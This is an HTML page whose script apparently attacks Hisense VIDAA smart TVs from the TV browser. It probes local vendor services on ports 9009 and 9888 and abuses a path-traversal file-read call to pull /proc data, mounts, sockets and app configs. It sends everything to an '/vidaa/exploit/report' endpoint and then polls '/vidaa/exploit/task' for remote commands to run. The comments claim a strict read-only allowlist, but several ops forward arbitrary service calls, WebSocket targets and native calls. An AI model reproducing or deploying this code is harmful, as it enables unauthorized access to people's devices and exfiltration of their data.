<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>VIDAA recon (read-only)</title>
<style>
body{background:#000;color:#0f0;font:24px/1.35 monospace;margin:.5em;}
#st{font-size:34px;color:#ff0;white-space:pre-wrap;} #det{color:#9f9;white-space:pre-wrap;} .bad{color:#f66;}
</style>
</head>
<body>
<div id="st">VIDAA RECON v4: starting...</div>
<div id="det"></div>
<script>
/* READ-ONLY recon v4 with live task loop.
   After the initial recon pass the page long-polls GET /vidaa/exploit/task
   and executes queued tasks in a FIXED interpreter (ops: fileRead, svc, ws,
   native, jsapi-getters-only, globals, enumerate, sleep, batch) under the
   same hard allowlist.
   No eval, no setters, no download-to-TV, no writes - the server validates
   tasks against the same allowlist before queueing them.
   v2/v3 facts on this build: http 9009 + wss 9888 work from browser pages;
   fileRead needs one-element ARRAY paths; vendor replies embed raw newlines
   (lenient parse below). */
(function () {
  "use strict";
  var R = { phase: "recon4", t: new Date().toISOString(), ua: navigator.userAgent,
            url: location.href, get_reach: {}, ws_start: [], http_svc: {},
            native: {}, fileread_variant: null, reads: {}, services: {},
            bridge_globals: {}, hisense_fns: null, errors: [] };
  function det(s) { var d = document.getElementById("det"); d.innerHTML += s + "<br>"; window.scrollTo(0, 1e9); }
  function st(s) { document.getElementById("st").textContent = s; }
  function js(v) { try { return JSON.stringify(v).slice(0, 400); } catch (e) { return String(v).slice(0, 400); } }

  var SVC_ALLOW = { tvinfo: ["initialData"],
                    hiutils: ["getOSVersion", "getVersionStatus", "fileRead"],
                    pkgmgr: ["getInstalledPkgs"] };
  var START_ALLOW = ["basic/fetcher"]; /* start probe only; never any file-transfer api */
  var BASES = ["http://localhost:9009", "http://127.0.0.1:9009",
               "https://localhost:9888", "https://127.0.0.1:9888"];
  var READ_TARGETS = ["../proc/uptime", "../proc/version", "../proc/self/status",
                      "../proc/mounts", "../proc/net/unix",
                      "../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/services/serviceList.json",
                      "../var/run/superwatch_socket", "../var/local", "../OAD/AppUpgradeSwitch.json"];
  var goodBase = null;

  function parseVendor(r) {
    if (!r) return r;
    if (r.ret !== undefined) return r;
    if (typeof r.text !== "string") return r;
    try { return JSON.parse(r.text); } catch (e) { /* fall through */ }
    var mret = /"ret"\s*:\s*(true|false)/.exec(r.text);
    if (!mret) return r;
    var msg = null;
    var mm = /"msg"\s*:\s*"([\s\S]*?)","(?:session|identifier)"/.exec(r.text);
    if (mm) msg = mm[1].replace(/\\n/g, "\n").replace(/\\"/g, '"');
    else {
      var start = r.text.indexOf('"msg":');
      if (start >= 0) msg = r.text.slice(start + 6, start + 6000);
    }
    return { ret: mret[1] === "true", msg: msg, lenient: true };
  }
  function isOk(r) { return !!(r && r.ret === true); }
  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
  function clip(v, n) { var s = (typeof v === "string") ? v : js(v); return s.slice(0, n || 4000); }

  function getReach(base) {
    return fetch(base + "/", { mode: "no-cors" }).then(function (r) {
      return { reachable: true, note: "opaque " + (r && r.type) };
    }).catch(function (e) {
      return { reachable: false, err: String(e && e.name ? e.name + ": " + e.message : e).slice(0, 120) };
    });
  }

  function httpCall(base, svc, api, args, ms) {
    if (!(SVC_ALLOW[svc] && SVC_ALLOW[svc].indexOf(api) >= 0)) {
      R.errors.push("blocked:" + svc + "." + api);
      return Promise.resolve({ blocked: true });
    }
    var ctrl = (typeof AbortController === "function") ? new AbortController() : null;
    var timer = setTimeout(function () { if (ctrl) ctrl.abort(); }, ms || 4000);
    return fetch(base + "/service/" + svc, {
      method: "POST",
      headers: { "content-type": "application/json", "identifier": "" },
      body: JSON.stringify({ api: api, args: args === undefined ? "" : args }),
      signal: ctrl ? ctrl.signal : undefined
    }).then(function (r) {
      return r.text().then(function (t) { clearTimeout(timer); return { status: r.status, text: t.slice(0, 30000) }; });
    }).catch(function (e) {
      clearTimeout(timer);
      return { fetchError: String(e && e.name ? e.name + ": " + e.message : e).slice(0, 160) };
    });
  }

  function wsRun(target, messages, ms) {
    return new Promise(function (resolve) {
      var ws, done = false, frames = [];
      function fin(o) { if (done) return; done = true; o.frames = frames;
        try { if (ws) ws.close(); } catch (e) {} resolve(o); }
      try { ws = new WebSocket(target); } catch (e) { return fin({ target: target, opened: false, exc: String(e) }); }
      ws.onopen = function () {
        try { for (var i = 0; i < messages.length; i++) ws.send(JSON.stringify(messages[i])); } catch (e) {}
        setTimeout(function () { fin({ target: target, opened: true }); }, ms || 1800);
      };
      ws.onmessage = function (m) { if (frames.length < 20) frames.push(String(m.data).slice(0, 2000)); };
      ws.onerror = function () { fin({ target: target, opened: false, err: "ws error" }); };
      ws.onclose = function (c) { fin({ target: target, opened: false, err: "closed " + c.code }); };
      setTimeout(function () { fin({ target: target, opened: false, err: "timeout" }); }, 8000);
    });
  }

  function nativeCall(api, args) {
    if (typeof window.HiUtils_createRequest !== "function") return { skipped: "HiUtils_createRequest absent" };
    try {
      var r = window.HiUtils_createRequest(api, args);
      return { ret: r && r.ret === true, msg: typeof r.msg === "string" ? r.msg.slice(0, 1400) : js(r.msg) };
    } catch (e) { return { exc: String(e) }; }
  }

  function probeGlobals() {
    var names = ["HiUtils_createRequest", "TvInfo_getParam", "vowOS", "omi_platform",
                 "WebSDK_createFileRequest", "Hisense_SetPictureMode"];
    for (var i = 0; i < names.length; i++) {
      try { R.bridge_globals[names[i]] = typeof window[names[i]]; } catch (e) { R.bridge_globals[names[i]] = "err"; }
    }
    try {
      R.hisense_fns = Object.keys(window).filter(function (k) { return k.indexOf("Hisense_") === 0; }).length;
    } catch (e) { R.hisense_fns = "err"; }
    try { R.native.uptime = nativeCall("fileRead", { mode: 6, path: ["../proc/uptime"] }); } catch (e) { R.native.error = String(e); }
  }

  function filterContent(path, content) {
    if (typeof content !== "string") return content;
    if (path === "../proc/self/status") {
      return content.split("\n").filter(function (l) { return /^(Name|Uid|Gid|Groups):/.test(l); }).join(" | ");
    }
    if (path === "../proc/mounts") {
      return content.split("\n").filter(function (l) { return l.indexOf(" rw,") >= 0; }).join(" | ").slice(0, 1400);
    }
    if (path === "../proc/net/unix") {
      var lns = content.split("\n").filter(function (l) { return l.indexOf("superwatch") >= 0 || l.indexOf("Path") >= 0; });
      return lns.join(" | ").slice(0, 1200) || "no superwatch lines";
    }
    return content.slice(0, 3000);
  }

  function recordRead(path, res, via) {
    if (isOk(res)) R.reads[path] = { ok: filterContent(path, res.msg), via: via };
    else R.reads[path] = { err: js(res).slice(0, 220), via: via };
  }

  async function httpProbe() {
    for (var b = 0; b < BASES.length; b++) {
      var base = BASES[b];
      var os = parseVendor(await httpCall(base, "hiutils", "getOSVersion", "", 4000));
      var id = parseVendor(await httpCall(base, "tvinfo", "initialData", "", 4000));
      var vstr = parseVendor(await httpCall(base, "hiutils", "fileRead", { mode: 6, path: "../proc/uptime" }, 4000));
      var varr = parseVendor(await httpCall(base, "hiutils", "fileRead", { mode: 6, path: ["../proc/uptime"] }, 4000));
      R.http_svc[base] = {
        getOSVersion: isOk(os) ? String(os.msg).slice(0, 120) : js(os),
        initialData: isOk(id) ? "OK" : js(id),
        read_string: isOk(vstr) ? String(vstr.msg).slice(0, 60) : js(vstr),
        read_array: isOk(varr) ? String(varr.msg).slice(0, 60) : js(varr)
      };
      det("base " + base + ": os=" + R.http_svc[base].getOSVersion + " id=" + R.http_svc[base].initialData);
      if (isOk(id) && !R.services.initialData) R.services.initialData = id.msg;
      var form = isOk(varr) ? "array" : (isOk(vstr) ? "string" : null);
      if (form && !R.fileread_variant) {
        goodBase = base;
        R.fileread_variant = form;
        R.reads["../proc/uptime"] = { ok: String((form === "array" ? varr : vstr).msg).slice(0, 200), via: form + "@" + base };
        for (var j = 1; j < READ_TARGETS.length; j++) {
          var path = READ_TARGETS[j];
          var args = (form === "array") ? { mode: 6, path: [path] } : { mode: 6, path: path };
          var res = parseVendor(await httpCall(base, "hiutils", "fileRead", args, 5000));
          recordRead(path, res, form + "@" + base);
          det("read " + path + " -> " + (isOk(res) ? "OK" : "fail"));
        }
        var pkg = parseVendor(await httpCall(base, "pkgmgr", "getInstalledPkgs", "", 5000));
        if (isOk(pkg)) {
          var list = pkg.msg || [];
          if (typeof list === "string") { try { list = JSON.parse(list); } catch (e) { list = []; } }
          R.pkglist_trunc = { count: list.length || 0,
            has_jsservice_basic: (list.some ? list.some(function (p) { return String(p.name || p).indexOf("jsservice.basic") >= 0; }) : false),
            sample: js(list).slice(0, 900) };
        } else R.pkglist_trunc = pkg;
        return;
      }
    }
  }

  /* ---------- task interpreter (fixed ops; server mirrors this allowlist) ---------- */
  async function execOp(op) {
    if (op.op === "sleep") { await sleep(Math.min(op.ms || 0, 10000)); return { slept: op.ms }; }
    if (op.op === "batch") {
      var out = [];
      for (var i = 0; i < (op.ops || []).length && i < 20; i++) out.push(await execOp(op.ops[i]));
      return { results: out };
    }
    if (op.op === "fileRead") {
      var base = op.base || goodBase || BASES[0];
      var pathVal = op.array === false ? op.path : [op.path];
      var res = parseVendor(await httpCall(base, "hiutils", "fileRead", { mode: op.mode || 6, path: pathVal }, 6000));
      return { ok: isOk(res), path: op.path, content: clip(res && res.msg !== undefined ? filterContent(op.path, res.msg) : res, 6000) };
    }
    if (op.op === "svc") {
      var base2 = op.base || goodBase || BASES[0];
      var r2 = parseVendor(await httpCall(base2, op.svc, op.api, op.args, 6000));
      return { ok: isOk(r2), content: clip(r2 && r2.msg !== undefined ? r2.msg : r2, 6000) };
    }
    if (op.op === "jsapi") {
      if (!/^(?:Hisense_Get|His_get)[A-Za-z0-9_]{0,60}$/.test(op.fn || "")) return { rejected: "jsapi getter-only" };
      var fn = window[op.fn];
      if (typeof fn !== "function") return { missing: op.fn };
      try {
        var rv = fn.apply(window, op.args || []);
        return { fn: op.fn, ret: clip(rv, 9000) };
      } catch (e) { return { fn: op.fn, exc: String(e) }; }
    }
    if (op.op === "native") return nativeCall(op.api, op.args);
    if (op.op === "ws") return await wsRun(op.target, op.messages || [], op.ms);
    if (op.op === "globals") {
      var g = {};
      var names = (op.names || []).slice(0, 30);
      for (var k = 0; k < names.length; k++) {
        try { g[names[k]] = typeof window[names[k]]; } catch (e) { g[names[k]] = "err"; }
      }
      return { globals: g };
    }
    if (op.op === "enumerate") {
      var re;
      try { re = new RegExp(op.filter, "i"); } catch (e) { return { badRegex: String(e) }; }
      var hits = [];
      try {
        var keys = Object.keys(window);
        for (var n = 0; n < keys.length && hits.length < 300; n++) {
          if (re.test(keys[n])) {
            var ty = "err";
            try { ty = typeof window[keys[n]]; } catch (e) {}
            hits.push(keys[n] + ":" + ty);
          }
        }
      } catch (e) { return { exc: String(e) }; }
      return { count: hits.length, names: hits };
    }
    return { rejected: "op not in interpreter" };
  }

  async function taskLoop() {
    var seen = 0;
    st("VIDAA RECON v4: idle (rev " + seen + ") - waiting for commands");
    for (;;) {
      try {
        var r = await fetch("/vidaa/exploit/task?seen=" + seen, { method: "GET" });
        var j = JSON.parse(await r.text());
        if (j && j.task && j.rev > seen) {
          seen = j.rev;
          st("VIDAA RECON v4: running task rev=" + seen + " op=" + (j.task.op || "?"));
          var t0 = Date.now();
          var result = await execOp(j.task);
          st("VIDAA RECON v4: task rev=" + seen + " done (" + (Date.now() - t0) + "ms) - back to waiting");
          var cmdReport = { phase: "cmd", rev: seen, t: new Date().toISOString(), ua: navigator.userAgent,
                            url: location.href, cmd: { rev: seen, op: j.task.op || "batch",
                            args: clip(j.task, 500), ms: Date.now() - t0 },
                            result: result, reads: {}, errors: [] };
          if (j.task.op === "fileRead") cmdReport.reads[String(j.task.path)] = { ok: clip(result && result.content, 1200) };
          await fetch("/vidaa/exploit/report", { method: "POST", headers: { "content-type": "application/json" },
                                                 body: JSON.stringify(cmdReport) });
        }
      } catch (e) { R.errors.push("task poll: " + String(e)); }
      await sleep(2000);
    }
  }

  async function run() {
    st("VIDAA RECON v4: running...");
    probeGlobals();
    det("native uptime lane: " + (R.native.uptime && R.native.uptime.ret ? "WORKS" : "no/blocked"));
    for (var g = 0; g < BASES.length; g++) R.get_reach[BASES[g]] = await getReach(BASES[g]);
    det("reach: " + js(R.get_reach));
    var opened = false;
    var wsTargets = ["wss://localhost:9888", "ws://localhost:9888", "wss://127.0.0.1:9888", "ws://127.0.0.1:9888"];
    for (var w = 0; w < wsTargets.length && !opened; w++) {
      var a = await wsRun(wsTargets[w], [{ path: "phoenix://service/" + START_ALLOW[0], method: "start",
                                           parameters: {}, session: 901, timeout: 10 }], 1600);
      R.ws_start.push(a);
      det("ws " + a.target + " opened=" + a.opened);
      opened = a.opened;
    }
    await httpProbe();
    if (typeof window.HiUtils_createRequest === "function") {
      for (var k = 0; k < READ_TARGETS.length; k++) {
        var p = READ_TARGETS[k];
        var cur = R.reads[p];
        if (cur && cur.ok !== undefined) continue;
        var nr = nativeCall("fileRead", { mode: 6, path: [p] });
        if (nr.ret) recordRead(p, nr, "native-array");
        else if (!cur) recordRead(p, nr, "native-array");
      }
    }
    if (!R.fileread_variant && !R.services.initialData && !opened) R.errors.push("no phoenix transport reachable from page");
    st("VIDAA RECON v4: initial pass done - sending report...");
    try {
      var rp = await fetch("/vidaa/exploit/report", { method: "POST", headers: { "content-type": "application/json" },
                                                      body: JSON.stringify(R) });
      det("initial report: http " + rp.status);
    } catch (e) { det("report send failed: " + e); }
    taskLoop();
  }

  if (document.readyState === "complete" || document.readyState === "interactive") run();
  else document.addEventListener("DOMContentLoaded", run);
})();
</script>
</body>
</html>
